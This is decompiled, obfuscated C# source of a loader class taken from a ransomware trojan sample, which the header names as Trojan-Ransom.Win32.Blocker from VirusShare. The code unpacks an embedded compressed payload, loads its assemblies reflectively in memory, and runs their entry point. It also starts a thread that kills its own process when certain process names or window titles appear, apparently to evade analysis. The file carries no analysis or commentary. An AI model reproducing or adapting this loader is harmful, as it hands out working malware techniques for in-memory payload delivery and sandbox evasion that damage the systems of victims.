// Decompiled with JetBrains decompiler
// Type: ?11?
// Assembly: wLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89823795-D5B3-4CC9-949D-6649607AF138
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bndr-d893b556a8d0493f8839c80049bd91fd0bdbcb93646edcc7b2f28d89325ced11.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

internal sealed class \u003F11\u003F
{
  public static \u003F11\u003F.\u003F5\u003F \u003F0\u003F;
  public static string[] \u003F0\u003F;
  public static MemoryStream[] \u003F0\u003F;
  public static string[] \u003F5\u003F;
  public static string[] \u003F9\u003F;
  public static bool \u003F0\u003F = false;

  private static long \u003F0\u003F(Stream _param0)
  {
    long num1 = 0;
    int num2 = 0;
    int num3;
    int num4;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num3 = 0;
          num2 = 1;
          continue;
        case 1:
          if (num3 < 8)
          {
            num4 = _param0.ReadByte();
            num2 = 2;
            continue;
          }
          goto label_7;
        case 2:
          num1 |= (long) (byte) num4 << 8 * num3;
          num2 = 3;
          continue;
        default:
          ++num3;
          goto case 1;
      }
    }
label_7:
    return num1;
  }

  private static \u003F11\u003F.\u003F5\u003F \u003F0\u003F(MemoryStream _param0)
  {
    byte[] buffer = new byte[Marshal.SizeOf(typeof (\u003F11\u003F.\u003F5\u003F))];
    _param0.Read(buffer, 0, Marshal.SizeOf(typeof (\u003F11\u003F.\u003F5\u003F)));
    GCHandle gcHandle = GCHandle.Alloc((object) buffer, GCHandleType.Pinned);
    \u003F11\u003F.\u003F5\u003F structure = (\u003F11\u003F.\u003F5\u003F) Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), typeof (\u003F11\u003F.\u003F5\u003F));
    gcHandle.Free();
    return structure;
  }

  private static \u003F11\u003F.\u003F0\u003F \u003F0\u003F(
    MemoryStream _param0,
    int _param1,
    ref string _param2,
    ref MemoryStream _param3)
  {
    byte[] buffer1 = new byte[Marshal.SizeOf(typeof (\u003F11\u003F.\u003F0\u003F))];
    _param0.Seek((long) _param1, SeekOrigin.Begin);
    _param0.Read(buffer1, 0, Marshal.SizeOf(typeof (\u003F11\u003F.\u003F0\u003F)));
    GCHandle gcHandle = GCHandle.Alloc((object) buffer1, GCHandleType.Pinned);
    \u003F11\u003F.\u003F0\u003F structure = (\u003F11\u003F.\u003F0\u003F) Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), typeof (\u003F11\u003F.\u003F0\u003F));
    gcHandle.Free();
    byte[] numArray = new byte[structure.\u003F11\u003F];
    _param0.Seek((long) structure.\u003F9\u003F, SeekOrigin.Begin);
    _param0.Read(numArray, 0, structure.\u003F11\u003F);
    _param2 = Encoding.UTF8.GetString(numArray);
    byte[] buffer2 = new byte[structure.\u003F5\u003F];
    _param0.Seek((long) structure.\u003F0\u003F, SeekOrigin.Begin);
    _param0.Read(buffer2, 0, structure.\u003F5\u003F);
    _param3.Write(buffer2, 0, structure.\u003F5\u003F);
    return structure;
  }

  private static string \u003F0\u003F(MemoryStream _param0, int _param1, int _param2)
  {
    byte[] numArray = new byte[_param2];
    _param0.Seek((long) _param1, SeekOrigin.Begin);
    _param0.Read(numArray, 0, _param2);
    return Encoding.UTF8.GetString(numArray);
  }

  private static Assembly \u003F0\u003F(object _param0, ResolveEventArgs _param1)
  {
    string strB = new AssemblyName(_param1.Name).Name + \u003F20\u003F.\u003F53\u003F(193);
    for (int index = 1; index < \u003F11\u003F.\u003F0\u003F.\u003F0\u003F; ++index)
    {
      if (string.Compare(\u003F11\u003F.\u003F0\u003F[index], strB, true) == 0)
        return Assembly.Load(\u003F11\u003F.\u003F0\u003F[index].ToArray());
    }
    return (Assembly) null;
  }

  public static bool \u003F0\u003F(string _param0, string _param1)
  {
    switch (_param0)
    {
      case null:
        return false;
      default:
        if (_param0.Length != 0)
          return new Regex(_param1.Replace(\u003F20\u003F.\u003F53\u003F(202), \u003F20\u003F.\u003F53\u003F(207)).Replace(\u003F20\u003F.\u003F53\u003F(212), \u003F20\u003F.\u003F53\u003F(217)).Replace('?', '.').ToLower()).IsMatch(_param0.ToLower());
        goto case null;
    }
  }

  public static bool \u003F0\u003F(string _param0, string[] _param1)
  {
    string[] strArray = _param1;
    int num = 0;
    int index;
    string str;
    bool flag;
    while (true)
    {
      switch (num)
      {
        case 0:
          index = 0;
          num = 1;
          continue;
        case 1:
          if (index < strArray.Length)
          {
            str = strArray[index];
            num = 2;
            continue;
          }
          goto label_8;
        case 2:
          if (!\u003F11\u003F.\u003F0\u003F(_param0, str))
          {
            ++index;
            goto case 1;
          }
          else
          {
            flag = true;
            num = 3;
            continue;
          }
        default:
          goto label_9;
      }
    }
label_8:
    return false;
label_9:
    return flag;
  }

  public static void \u003F0\u003F()
  {
    Process.GetCurrentProcess().CloseMainWindow();
    Process.GetCurrentProcess().Close();
    Process.GetCurrentProcess().Kill();
  }

  public static void \u003F5\u003F()
  {
label_0:
    while (!\u003F11\u003F.\u003F0\u003F)
    {
      Process[] processes = Process.GetProcesses();
      int num = 0;
      int index;
      while (true)
      {
        switch (num)
        {
          case 0:
            index = 0;
            num = 1;
            continue;
          case 1:
            if (index < processes.Length - 1)
            {
              if (\u003F11\u003F.\u003F0\u003F(processes[index].ProcessName, \u003F11\u003F.\u003F5\u003F))
                goto label_9;
label_5:
              if (\u003F11\u003F.\u003F0\u003F(processes[index].MainWindowTitle, \u003F11\u003F.\u003F9\u003F))
                goto label_10;
label_6:
              Thread.Sleep(100);
              num = 2;
              continue;
label_10:
              \u003F11\u003F.\u003F0\u003F();
              goto label_6;
label_9:
              \u003F11\u003F.\u003F0\u003F();
              goto label_5;
            }
            else
            {
              Thread.Sleep(1500);
              num = 3;
              continue;
            }
          case 2:
            ++index;
            goto case 1;
          default:
            goto label_0;
        }
      }
    }
  }

  [STAThread]
  private static void \u003F0\u003F(string[] _param0)
  {
    MemoryStream memoryStream1 = new MemoryStream();
    int num1 = 0;
    Assembly assembly;
    while (true)
    {
      MemoryStream memoryStream2;
      long num2;
      byte[] buffer;
      \u003F10\u003F obj;
      long num3;
      Thread thread;
      int num4;
      int index;
      switch (num1)
      {
        case 0:
          memoryStream2 = new MemoryStream(\u003F9\u003F.\u003F0\u003F());
          num1 = 1;
          continue;
        case 1:
          memoryStream2.Seek(-8L, SeekOrigin.End);
          num1 = 2;
          continue;
        case 2:
          num2 = \u003F11\u003F.\u003F0\u003F((Stream) memoryStream2);
          num1 = 3;
          continue;
        case 3:
          memoryStream2.Seek(-num2 - 8L, SeekOrigin.Current);
          num1 = 4;
          continue;
        case 4:
          buffer = new byte[5];
          num1 = 5;
          continue;
        case 5:
          memoryStream2.Read(buffer, 0, 5);
          num1 = 6;
          continue;
        case 6:
          obj = new \u003F10\u003F();
          num1 = 7;
          continue;
        case 7:
          obj.\u0003\u2000\u2009\u2001\u0002(buffer);
          num1 = 8;
          continue;
        case 8:
          num3 = \u003F11\u003F.\u003F0\u003F((Stream) memoryStream2);
          num1 = 9;
          continue;
        case 9:
          obj.\u0002\u2002\u2009\u2001\u0002((Stream) memoryStream2, (Stream) memoryStream1, num2, num3, (\u003F16\u003F) null);
          num1 = 10;
          continue;
        case 10:
          memoryStream2.Close();
          num1 = 11;
          continue;
        case 11:
          memoryStream1.Seek(0L, SeekOrigin.Begin);
          num1 = 12;
          continue;
        case 12:
          \u003F11\u003F.\u003F0\u003F = \u003F11\u003F.\u003F0\u003F(memoryStream1);
          num1 = 13;
          continue;
        case 13:
          if (\u003F11\u003F.\u003F0\u003F.\u003F0\u003F)
          {
            \u003F11\u003F.\u003F5\u003F = \u003F11\u003F.\u003F0\u003F(memoryStream1, \u003F11\u003F.\u003F0\u003F.\u003F5\u003F, \u003F11\u003F.\u003F0\u003F.\u003F9\u003F).Split('|');
            num1 = 14;
            continue;
          }
          break;
        case 14:
          \u003F11\u003F.\u003F9\u003F = \u003F11\u003F.\u003F0\u003F(memoryStream1, \u003F11\u003F.\u003F0\u003F.\u003F11\u003F, \u003F11\u003F.\u003F0\u003F.\u003F12\u003F).Split('|');
          num1 = 15;
          continue;
        case 15:
          thread = new Thread(new ThreadStart(\u003F11\u003F.\u003F5\u003F));
          num1 = 16;
          continue;
        case 16:
          thread.Start();
          break;
        case 17:
          \u003F11\u003F.\u003F0\u003F = new MemoryStream[\u003F11\u003F.\u003F0\u003F.\u003F0\u003F];
          num1 = 18;
          continue;
        case 18:
          num4 = Marshal.SizeOf(typeof (\u003F11\u003F.\u003F5\u003F));
          num1 = 19;
          continue;
        case 19:
          index = 0;
          num1 = 20;
          continue;
        case 20:
          if (index < \u003F11\u003F.\u003F0\u003F.\u003F0\u003F)
          {
            \u003F11\u003F.\u003F0\u003F[index] = string.Empty;
            num1 = 21;
            continue;
          }
          if (\u003F11\u003F.\u003F0\u003F.\u003F0\u003F > 1)
            goto label_35;
label_29:
          assembly = Assembly.Load(\u003F11\u003F.\u003F0\u003F[0].ToArray());
          num1 = 25;
          continue;
label_35:
          AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u003F11\u003F.\u003F0\u003F);
          goto label_29;
        case 21:
          \u003F11\u003F.\u003F0\u003F[index] = new MemoryStream();
          num1 = 22;
          continue;
        case 22:
          \u003F11\u003F.\u003F0\u003F(memoryStream1, num4, ref \u003F11\u003F.\u003F0\u003F[index], ref \u003F11\u003F.\u003F0\u003F[index]);
          num1 = 23;
          continue;
        case 23:
          num4 += Marshal.SizeOf(typeof (\u003F11\u003F.\u003F0\u003F));
          num1 = 24;
          continue;
        case 24:
          ++index;
          goto case 20;
        case 25:
          if ((object) assembly != null)
          {
            if (assembly.EntryPoint.GetParameters().Length == 0)
            {
              assembly.EntryPoint.Invoke((object) null, (object[]) null);
              num1 = 26;
              continue;
            }
            goto label_31;
          }
          else
            goto label_32;
        default:
          goto label_32;
      }
      \u003F11\u003F.\u003F0\u003F = new string[\u003F11\u003F.\u003F0\u003F.\u003F0\u003F];
      num1 = 17;
    }
label_31:
    assembly.EntryPoint.Invoke((object) null, new object[1]
    {
      (object) _param0
    });
label_32:
    if (!\u003F11\u003F.\u003F0\u003F.\u003F0\u003F)
      return;
    \u003F11\u003F.\u003F0\u003F = \u003F11\u003F.\u003F0\u003F.\u003F0\u003F;
  }

  public struct \u003F0\u003F
  {
    public int \u003F0\u003F;
    public int \u003F5\u003F;
    public int \u003F9\u003F;
    public int \u003F11\u003F;
  }

  public struct \u003F5\u003F
  {
    public bool \u003F0\u003F;
    public int \u003F0\u003F;
    public int \u003F5\u003F;
    public int \u003F9\u003F;
    public int \u003F11\u003F;
    public int \u003F12\u003F;
  }
}
